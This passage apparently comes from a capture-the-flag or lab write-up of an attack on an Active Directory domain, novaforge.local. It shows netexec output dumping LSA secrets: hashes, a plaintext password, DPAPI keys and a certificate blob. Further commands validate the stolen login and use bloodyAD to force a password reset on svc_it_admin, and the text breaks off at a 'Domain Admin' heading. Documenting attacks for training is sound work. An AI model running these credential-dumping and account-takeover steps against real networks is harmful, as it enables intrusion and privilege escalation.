SMB         10.0.0.101      445    STORAGE          NOVAFORGE\STORAGE$:plain_password_hex:35006c00570041005200370078006b00430067006c004e00480067006d00790042006200730053003200670051004d006a006f004c00520051004500340072004d00300030004a0078005600350079007500550041004c00790048003900690048007100790037005a0076002b004700750068004500760030007100440067004f006b005500350052006d004c006d0076004a0077004c005800760059003d00390076005200330050007200640078003600300047003400340063006600700030006c006f00300053006900650055007000620045004d002b0049006800640039004500440051006d003d005a0035003500720037006e003d0035003500660043007400580043006c00460076004300470045005a0064006200640041006c00630071007100620062003000630071006a003800680038003d0057003300550071006d004900670057004e00300064005500780033006500670068006d003100660051004b0053006900530044006400520037004c00330053004d0068004d00750044005100470052005900410063005800480035004f00630056007a00380077004f006a0030005000770078004b00340046006d0073006e00590043003200340031002b006800310067005a006f004b0039003d005a007a0032007500440053005a004f0068006700370039006700620033007a0059003d0053004f005300
SMB         10.0.0.101      445    STORAGE          NOVAFORGE\STORAGE$:aad3b435b51404eeaad3b435b51404ee:72d049027fee0c6bb82b176a2834d83f:::
SMB         10.0.0.101      445    STORAGE          NOVAFORGE\frank.white:1hatefrank
SMB         10.0.0.101      445    STORAGE          dpapi_machinekey:0xbcdb9bc1d8b520c6bdb3bc33f99e95b15183bce7
dpapi_userkey:0x1bdbc82a835ea3404214778c4a09ca8fb9c4643e
SMB         10.0.0.101      445    STORAGE          M$MachineBoundCertificate:7600000001000000030300000303000000000000170000006400000001000000010100000100000099146de538ef05d7ddea1f4e4906a6cb7322b65cc6238efecb8c9e5759b1e1b10a753bf8dbe1ef9d0c86d7c7855ab96f0100000000000000000000000000000001000000880200004c736149736f4173796d6d65747269634b6579426c6f62dd97d94df15c0a01fd10ce3867926525978543e62cd3e2d1e7f48ca94eba9a2feb7ebab47fd8ea1ec2087f49187c46e26d0bb5a2e090afd4aade36296c7ffde937a3187b818a536843f9994c759f7d09be6603d76fe33915db1d8fa7a84ff6721494fa8cf4f40e98c7f98c578084ec7cdf708316bc1517b2a6febb9b7e360011ef00348ecc4f320ee68de6d4ed29654e78ea8935b5fa6c9e9754f40f24d6e87626e593d5fbe6f0c219829857eecf6c92beef373703d7010db37ea5d308def750ae432f85ee91946620b2aaf5be68c915000e2f3b74292353fefc4f263fd73a78c1e887ed89f440949b91c0a48a02ba791ba5ded7bba98b91ba939a27c87c12da3ac44bf0ceb0640613d7c7ce317a0d5dfc61c3d6e87982b5a3d1b4e7c864474eb3f4ee70fa0386ac9729dfdfe2cef2a4f43959e8fd3c87439e794d0ce546c1592df021f63637b71f91f266f2e931f4306aa809bba43930504b1206552343df5aa80fb2e91f8a2124833ab598082c9e7946b6c8578d8fd1f7be49b300541eaa9ec835ef35ae96fa42deed30cd447d5d44a5eeef1270b4e5b8adf3d27c74fe0c03a03fc19ccfc90b74fd8e1529460991ab418ba19011fc6b3c3900e9f9b8f448f8f4ba4103d74ec46b9116efaee0f250c0f92179182bf0d5594cd1a23887c96ccc145baaf96a5e70dfd619afb59164dffdd55e5d7adc7faf5535ebc0a2b4cd0038a0caa33990e3c8ad15d78c40f28e872dbfbc8df758bf7b3516f2e7abbf74152852098885ef437a87d4ec4bd494d0fbc085dff872814003dec9271dca2c421d3f12e949f33cfeaf3c2bc4d0ab9951590ef7d93309e283af3c3307e5bb9643a997ce0bbd990481f37d2ca711dd68bea5a48e7a17716efcc1e32bbbdf6a416aeb2eb5c89cba6a068cab2000000001000000a9020000308202a53082018da003020102020101300d06092a864886f70d01010b050030153113301106035504030c0a434e3d53544f524147453020170d3236303631393233343835365a180f32313236303532363233343835365a30153113301106035504030c0a434e3d53544f5241474530820122300d06092a864886f70d01010105000382010f003082010a0282010100e7dcd554f7d1e27f6abbd6c77b39a60b1c33cdf2270461db460ae9b2db789cd1b91fff915f78586c53b592ea2f2cdbfce11fc77837c10bd3bb46a04c3d6fc3f938d317d5c26eecfa90a50cdbe77c01ce9d4939f32f55b8c5ae89450d17bca270b2ff490ada86577649c661a22a33929b64df997001d16165347d3f8f77f163ae3d558987c20519ed100f4359b5fa089119924e4b2f61772d9c55f6e3b15b6746367aa3136c8cd3accc076b8a955897e2e87661b26d996cebb2af653493da1f28f91e620140234ac48093a6bccb3abdc6b548f17c9d6fded7c4885b7d4894b16594d2bfda0885370238b2783f361faef083dba51c0848f57f0ec77475e586bf550203010001300d06092a864886f70d01010b05000382010100810047c69497cd18437db916b20f05caefc920237b3ecf5f224a34b7ed39762b2e8002d77a3295a8e21e4841f53d238c42c2356473f1fafd5086426c82d84863d3bb9bb80ce9fe1663ada4c991f19358f01462b3faf86bd57847a035e0b2ad6d49435d1a18071e27648772e8921304df92735bd9f9b1400a6d58467311d76a32366b2a4e9e1f03a646d8742d276c53771df1533010b693c85d384f0889a0656375445d433848814f862b092e1d8e01b36ea6a2957079da376b43da07a5e4a426eefdbabd9ccc221a4174f7139dc00cf5c46bd459286e6b095f8ec0f8f9f38b0ebbea19de4063303b8fbbe17cf0fb8712b3529ed7f0a3a2e4502ffe10658d537e
```

Ive got a plaintext password for the user `frank.white`

```python
frank.white:1hatefrank
```

```python
nxc smb dc.novaforge.local -u frank.white -p '1hatefrank' --smb-timeout 5
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\frank.white:1hatefrank
```

This user is now compromised!

# Compromising `svc_it_admin`

![](Pasted%20image%2020260808185141.png)

The newly compromised user has ForceChangePassword on this user

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u frank.white -p '1hatefrank' set password 'svc_it_admin' 'Password123!'
[+] Password changed successfully!
```

The password is now changed

```python
nxc smb dc.novaforge.local -u svc_it_admin -p 'Password123!'              
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\svc_it_admin:Password123!
```

This user is now compromised

# Domain Admin

